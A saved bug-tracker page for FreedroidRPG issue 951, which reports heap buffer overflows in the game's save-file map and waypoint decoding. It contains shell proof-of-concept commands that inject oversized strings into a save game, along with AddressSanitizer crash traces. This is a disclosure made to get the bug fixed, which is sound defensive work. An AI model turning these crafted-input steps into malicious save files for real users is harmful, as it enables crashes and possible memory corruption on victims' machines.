<!-- dollarId: issue.item,v 1.4 2001/08/03 01:19:43 richard Exp dollar-->
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<title>
Issue 951: Heap overflow in loading untrusted save game - FreedroidRPG issues

</title>

<link rel="stylesheet" title="Matthias Style"
      type="text/css" href="@@file/style_matthias.css">
<link rel="alternate stylesheet" title="Default" type="text/css" href="@@file/style_orig.css">
<link rel="alternate stylesheet" title="Style 2" type="text/css" href="@@file/style2.css">
<link rel="alternate stylesheet" title="Hail Style" type="text/css" href="@@file/style_hail.css">
<link rel="alternate stylesheet" title="Matthias Style" type="text/css" href="@@file/style_matthias.css">
<meta http-equiv="Content-Type"
      content="text/html; charset=utf-8" />

<script type="text/javascript">
submitted = false;
function submit_once() {
    if (submitted) {
        alert("Your request is being processed.\nPlease be patient.");
        event.returnValue = 0;    // work-around for IE
        return 0;
    }
    submitted = true;
    return 1;
}

function help_window(helpurl, width, height) {
    HelpWin = window.open('http://bugs.freedroid.org/b/' + helpurl, 'RoundupHelpWindow', 'scrollbars=yes,resizable=yes,toolbar=no,height='+height+',width='+width);
}
</script>



</head>
<body class="body">

<table class="body">

<tr>
 <td class="page-header-left">&nbsp;</td>
 <td class="page-header-top">
   <div id="searchbox">
     <form method="GET" action="issue">
       <input type="hidden" name="@columns"
              value="id,activity,title,creator,assignedto,status" />
       <input type="hidden" name="@sort" value="activity" />
       <input type="hidden" name="@group" value="priority" />
       <input id="search-text" name="@search_text" size="10" />
       <input type="submit" id="submit" name="submit"
              value="Search" />
     </form>
   </div>
   <div id="body-title">
     <h2>
 
 
 Issue951
 
</h2>
   </div>
 </td>
</tr>

<tr>
 <td rowspan="2" valign="top" class="sidebar">
  

  <form method="POST" action="http://bugs.freedroid.org/b/">
   <p class="classblock">
    <b>Issues</b><br>
    
<!--    <a href="#"
       tal:attributes="href python:request.indexargs_url('issue', {
      '@sort': '-activity',
      '@group': 'priority',
      '@filter': 'status,assignedto',
      '@columns': columns,
      '@search_text': '',
      'status': status_notresolved,
      'assignedto': '-1',
      '@dispname': i18n.gettext('Show Unassigned'),
     })"
       i18n:translate="">Show Unassigned</a><br>-->
    <a href="issue?status=-1,1,3,4&amp;@sort=-activity&amp;@search_text=&amp;@dispname=Show Not Resolved&amp;@filter=status&amp;@group=priority&amp;@columns=id,activity,title,creator,assignedto,status&amp;@pagesize=50&amp;@startwith=0">Show Not Resolved</a><br>
    <a href="issue?status=-1,1,2,3,4,5,6,7&amp;@sort=-activity&amp;@search_text=&amp;@dispname=Show All&amp;@filter=status&amp;@group=priority&amp;@columns=id,activity,title,creator,assignedto,status&amp;@pagesize=50&amp;@startwith=0">Show All</a><br>
    <a href="issue?@template=search">Search</a><br>
    <input type="submit" class="form-small"
           value="Show issue:"><input class="form-small" size="4" type="text" name="@number">
    <input type="hidden" name="@type" value="issue">
    <input type="hidden" name="@action" value="show">
   </p>
  </form>

  

  

  <form method="POST" action="http://bugs.freedroid.org/b/">
   <p class="userblock">
    <b>Login</b><br>
    <input size="10" name="__login_name"><br>
    <input size="10" type="password" name="__login_password"><br>
    <input type="hidden" name="@action" value="Login">
    <input type="checkbox" name="remember" id="remember">
    <label for="remember">Remember me?</label><br>
    <input type="submit" value="Login"><br>
    <input type="hidden" name="__came_from"
           value="http://bugs.freedroid.org/b/issue951">
    <input type="hidden" name="@sort" value="">
<input type="hidden" name="@group" value="">
<input type="hidden" name="@pagesize" value="50">
<input type="hidden" name="@startwith" value="0">
    <a href="user?@template=register">Register</a><br>
    <a href="user?@template=forgotten">Lost&nbsp;your&nbsp;login?</a><br>
   </p>
  </form>

  
  <p class="userblock">
   <b>Help</b><br>
   <a href="http://www.roundup-tracker.org">Roundup docs</a>
  </p>
 </td>
 <td>
  
 </td>
</tr>
<tr>
 <td class="content">





<div>

<form method="POST" name="itemSynopsis"
      onsubmit="return submit_once()"
      enctype="multipart/form-data" action="issue951">

<table class="form">
<tr>
 <th class="required">Title</th>
 <td colspan="3">Heap overflow in loading untrusted save game</td>
</tr>

<tr>
 <th class="required">Priority</th>
 <td>bug</td>
 <th>Status</th>
 <td>open</td>
</tr>

<tr>
 <th>Assigned To</th>
 <td>fluzz</td>
 <th>Keywords</th>
 <td>
  
  
 </td>
</tr>

<tr>
 <th>Linked issues</th>
 <td>
  
  
  
 </td>
 <th>Watchers</th>
 <td>
  fluzz
  <br>
 </td>
</tr>







</table>
</form>



<p>Submitted on <b>2019-07-25&nbsp;13h59</b> by <b>mmmds</b>, last changed  by <b>fluzz</b>.</p>



<table class="messages">
 <tr><th colspan="5" class="header">Messages</th></tr>
 
<!-- <tr tal:condition="python:int(msg.id) == 1"><th colspan="4" class="header" i18n:translate="" >Description</th></tr>
 <tr tal:condition="python:int(msg.id) == 2"><th colspan="4" class="header" i18n:translate="">Comments</th></tr>-->
  <tr>
<!--   <th><a tal:attributes="href string:msg${msg/id}"
    i18n:translate="">#<tal:x replace="msg/id" i18n:name="id" /></a></th>-->
   <th>Author: <span class="msgauthor">mmmds</span></th>
   <th>Date: <span class="msgdate">2019-07-25&nbsp;&nbsp;&nbsp;13h59</span></th>
   <th>
<!--    <form style="padding:0" method="POST" tal:condition="python: context.is_edit_ok and request.user.hasRole('Admin')"
          tal:attributes="action string:issue${context/id}">
     <input type="hidden" name="@remove@messages" tal:attributes="value msg/id">
     <input type="hidden" name="@action" value="edit">
     <input type="submit" value="remove" i18n:attributes="value">
    </form>-->
   </th>
  </tr>
  <tr>
   <td colspan="4" class="content">
    <pre>This issue assumes that users may load malicious save games, for example downloaded or 
received from other users.

There are fixed size buffers which can be overrun if save game file contains more than 
4096 characters between 
"beginning_of_map" and '\n' or between '' and '\n'.


Case 1:
map.c, static char *decode_map(level *loadlevel, char *data)

825  	this_line = (char *)MyMalloc(4096); &lt;- fixed size buffer
(...)
837  		while (map_begin[curlinepos + nlpos] != '\n') &lt;- increases nlpos until 
meets new line
838  			nlpos++;
839  		memcpy(this_line, map_begin + curlinepos, nlpos); &lt;- may write data 
outside the buffer


Case 2:
map.c, static char *decode_waypoints(level *loadlevel, char *data)

896   this_line = (char *)MyMalloc(4096);
(...)
902     while (wp_begin[curlinepos + nlpos] != '\n')
903       nlpos++;
904     memcpy(this_line, wp_begin + curlinepos, nlpos);




PoC case 1: 5000 'A' characters are added after "beginning_of_map" in a save game

cd ~/.freedroid_rpg
CH="mmm"
mv $CH.shp $CH.gz
gunzip $CH.gz
sed -i -e "0,/beginning_of_map/s/beginning_of_map/beginning_of_map `python -c 'print 
\"A\" * 5000'`/" $CH
gzip $CH
mv $CH.gz $CH.shp


PoC case 2: 5000 'A' characters are added after "wp" in a save game

cd ~/.freedroid_rpg
CH="mmm"
mv $CH.shp $CH.gz
gunzip $CH.gz
sed -i -e "0,/wp/s/wp/wp `python -c 'print \"A\" * 5000'`/" $CH
gzip $CH
mv $CH.gz $CH.shp




ASAN case 1:

==24511==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xa6583100 at pc 
0xb7a1ba42 bp 0xbfe940c8 sp 0xbfe93c9c
WRITE of size 5000 at 0xa6583100 thread T0
    #0 0xb7a1ba41 in __asan_memcpy (/usr/lib/i386-linux-gnu/libasan.so.2+0x8aa41)
    #1 0xb7a1bc2f in memcpy (/usr/lib/i386-linux-gnu/libasan.so.2+0x8ac2f)
    #2 0x80fc79b in decode_map /root/projects/freedroid-src/src/map.c:839
    #3 0x80fe326 in decode_level /root/projects/freedroid-src/src/map.c:1126
    #4 0x80ff639 in LoadShip /root/projects/freedroid-src/src/map.c:1303
    #5 0x8127b85 in load_saved_game /root/projects/freedroid-src/src/saveloadgame.c:366
    #6 0x8128240 in load_game /root/projects/freedroid-src/src/saveloadgame.c:478
    #7 0x810dbfd in load_named_game /root/projects/freedroid-src/src/menu.c:1680
    #8 0x810e57a in do_savegame_selection_and_act /root/projects/freedroid-
src/src/menu.c:1796
    #9 0x810e75c in Load_Existing_Hero_Menu /root/projects/freedroid-
src/src/menu.c:1827
    #10 0x810ecaf in Single_Player_Menu /root/projects/freedroid-src/src/menu.c:1895
    #11 0x8108ecd in Startup_handle /root/projects/freedroid-src/src/menu.c:930
    #12 0x8108b6a in RunSubMenu /root/projects/freedroid-src/src/menu.c:872
    #13 0x8108e2f in RunMenu /root/projects/freedroid-src/src/menu.c:901
    #14 0x8108e4c in StartupMenu /root/projects/freedroid-src/src/menu.c:907
    #15 0x80f6e70 in main /root/projects/freedroid-src/src/main.c:179
    #16 0xb7548636 in __libc_start_main (/lib/i386-linux-gnu/libc.so.6+0x18636)
    #17 0x805c3ee  (/root/projects/freedroid-src/bin/bin/freedroidRPG+0x805c3ee)

0xa6583100 is located 0 bytes to the right of 4096-byte region [0xa6582100,0xa6583100)
allocated by thread T0 here:
    #0 0xb7a27f8e in calloc (/usr/lib/i386-linux-gnu/libasan.so.2+0x96f8e)
    #1 0x814a4fd in MyMalloc /root/projects/freedroid-src/src/text_public.c:68
    #2 0x80fc709 in decode_map /root/projects/freedroid-src/src/map.c:825
    #3 0x80fe326 in decode_level /root/projects/freedroid-src/src/map.c:1126
    #4 0x80ff639 in LoadShip /root/projects/freedroid-src/src/map.c:1303
    #5 0x8127b85 in load_saved_game /root/projects/freedroid-src/src/saveloadgame.c:366
    #6 0x8128240 in load_game /root/projects/freedroid-src/src/saveloadgame.c:478
    #7 0x810dbfd in load_named_game /root/projects/freedroid-src/src/menu.c:1680
    #8 0x810e57a in do_savegame_selection_and_act /root/projects/freedroid-
src/src/menu.c:1796
    #9 0x810e75c in Load_Existing_Hero_Menu /root/projects/freedroid-
src/src/menu.c:1827
    #10 0x810ecaf in Single_Player_Menu /root/projects/freedroid-src/src/menu.c:1895
    #11 0x8108ecd in Startup_handle /root/projects/freedroid-src/src/menu.c:930
    #12 0x8108b6a in RunSubMenu /root/projects/freedroid-src/src/menu.c:872
    #13 0x8108e2f in RunMenu /root/projects/freedroid-src/src/menu.c:901
    #14 0x8108e4c in StartupMenu /root/projects/freedroid-src/src/menu.c:907
    #15 0x80f6e70 in main /root/projects/freedroid-src/src/main.c:179
    #16 0xb7548636 in __libc_start_main (/lib/i386-linux-gnu/libc.so.6+0x18636)

SUMMARY: AddressSanitizer: heap-buffer-overflow ??:0 __asan_memcpy
Shadow bytes around the buggy address:
  0x34cb05d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x34cb05e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x34cb05f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x34cb0600: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x34cb0610: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=&gt;0x34cb0620:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x34cb0630: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x34cb0640: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x34cb0650: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x34cb0660: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x34cb0670: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
==24511==ABORTING


ASAN case 2:

==24556==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xa7c40d00 at pc 
0xb7a41a42 bp 0xbfc8eaa8 sp 0xbfc8e67c
WRITE of size 5000 at 0xa7c40d00 thread T0
    #0 0xb7a41a41 in __asan_memcpy (/usr/lib/i386-linux-gnu/libasan.so.2+0x8aa41)
    #1 0xb7a41c2f in memcpy (/usr/lib/i386-linux-gnu/libasan.so.2+0x8ac2f)
    #2 0x80fce5c in decode_waypoints /root/projects/freedroid-src/src/map.c:904
    #3 0x80fe3dc in decode_level /root/projects/freedroid-src/src/map.c:1134
    #4 0x80ff639 in LoadShip /root/projects/freedroid-src/src/map.c:1303
    #5 0x8127b85 in load_saved_game /root/projects/freedroid-src/src/saveloadgame.c:366
    #6 0x8128240 in load_game /root/projects/freedroid-src/src/saveloadgame.c:478
    #7 0x810dbfd in load_named_game /root/projects/freedroid-src/src/menu.c:1680
    #8 0x810e57a in do_savegame_selection_and_act /root/projects/freedroid-
src/src/menu.c:1796
    #9 0x810e75c in Load_Existing_Hero_Menu /root/projects/freedroid-
src/src/menu.c:1827
    #10 0x810ecaf in Single_Player_Menu /root/projects/freedroid-src/src/menu.c:1895
    #11 0x8108ecd in Startup_handle /root/projects/freedroid-src/src/menu.c:930
    #12 0x8108b6a in RunSubMenu /root/projects/freedroid-src/src/menu.c:872
    #13 0x8108e2f in RunMenu /root/projects/freedroid-src/src/menu.c:901
    #14 0x8108e4c in StartupMenu /root/projects/freedroid-src/src/menu.c:907
    #15 0x80f6e70 in main /root/projects/freedroid-src/src/main.c:179
    #16 0xb756e636 in __libc_start_main (/lib/i386-linux-gnu/libc.so.6+0x18636)
    #17 0x805c3ee  (/root/projects/freedroid-src/bin/bin/freedroidRPG+0x805c3ee)

0xa7c40d00 is located 0 bytes to the right of 4096-byte region [0xa7c3fd00,0xa7c40d00)
allocated by thread T0 here:
    #0 0xb7a4df8e in calloc (/usr/lib/i386-linux-gnu/libasan.so.2+0x96f8e)
    #1 0x814a4fd in MyMalloc /root/projects/freedroid-src/src/text_public.c:68
    #2 0x80fcd99 in decode_waypoints /root/projects/freedroid-src/src/map.c:896
    #3 0x80fe3dc in decode_level /root/projects/freedroid-src/src/map.c:1134
    #4 0x80ff639 in LoadShip /root/projects/freedroid-src/src/map.c:1303
    #5 0x8127b85 in load_saved_game /root/projects/freedroid-src/src/saveloadgame.c:366
    #6 0x8128240 in load_game /root/projects/freedroid-src/src/saveloadgame.c:478
    #7 0x810dbfd in load_named_game /root/projects/freedroid-src/src/menu.c:1680
    #8 0x810e57a in do_savegame_selection_and_act /root/projects/freedroid-
src/src/menu.c:1796
    #9 0x810e75c in Load_Existing_Hero_Menu /root/projects/freedroid-
src/src/menu.c:1827
    #10 0x810ecaf in Single_Player_Menu /root/projects/freedroid-src/src/menu.c:1895
    #11 0x8108ecd in Startup_handle /root/projects/freedroid-src/src/menu.c:930
    #12 0x8108b6a in RunSubMenu /root/projects/freedroid-src/src/menu.c:872
    #13 0x8108e2f in RunMenu /root/projects/freedroid-src/src/menu.c:901
    #14 0x8108e4c in StartupMenu /root/projects/freedroid-src/src/menu.c:907
    #15 0x80f6e70 in main /root/projects/freedroid-src/src/main.c:179
    #16 0xb756e636 in __libc_start_main (/lib/i386-linux-gnu/libc.so.6+0x18636)

SUMMARY: AddressSanitizer: heap-buffer-overflow ??:0 __asan_memcpy
Shadow bytes around the buggy address:
  0x34f88150: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x34f88160: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x34f88170: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x34f88180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x34f88190: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=&gt;0x34f881a0:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x34f881b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x34f881c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x34f881d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x34f881e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x34f881f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
==24556==ABORTING</pre>
    
   </td>
  </tr>

 
 
<!-- <tr tal:condition="python:int(msg.id) == 1"><th colspan="4" class="header" i18n:translate="" >Description</th></tr>
 <tr tal:condition="python:int(msg.id) == 2"><th colspan="4" class="header" i18n:translate="">Comments</th></tr>-->
  <tr>
<!--   <th><a tal:attributes="href string:msg${msg/id}"
    i18n:translate="">#<tal:x replace="msg/id" i18n:name="id" /></a></th>-->
   <th>Author: <span class="msgauthor">fluzz</span></th>
   <th>Date: <span class="msgdate">2020-06-29&nbsp;&nbsp;&nbsp;13h50</span></th>
   <th>
<!--    <form style="padding:0" method="POST" tal:condition="python: context.is_edit_ok and request.user.hasRole('Admin')"
          tal:attributes="action string:issue${context/id}">
     <input type="hidden" name="@remove@messages" tal:attributes="value msg/id">
     <input type="hidden" name="@action" value="edit">
     <input type="submit" value="remove" i18n:attributes="value">
    </form>-->
   </th>
  </tr>
  <tr>
   <td colspan="4" class="content">
    <pre>see <a href="issue968">issue968</a></pre>
    
   </td>
  </tr>

 
 
</table>

<table class="history"><tr><th colspan="4" class="header">
History
</th></tr><tr>
<th>Date</th>
<th>User</th>
<th>Action</th>
<th>Args</th>
</tr>
<tr><td>2020-06-29&nbsp;13:50:28</td><td>fluzz</td><td>set</td><td>assignedto: <a href="user4">fluzz</a><br />messages:
  + <a href="msg3694">msg3694</a><br />nosy:
  + <a href="user4">fluzz</a></td></tr>
<tr><td>2019-07-25&nbsp;13:59:09</td><td>mmmds</td><td>create</td><td></td></tr>
</table>

</div>

</td>
</tr>

</table>



</body>
</html>

<!-- SHA: a242ab3ed5c6969916f3c42f80d487710f165fb8 -->
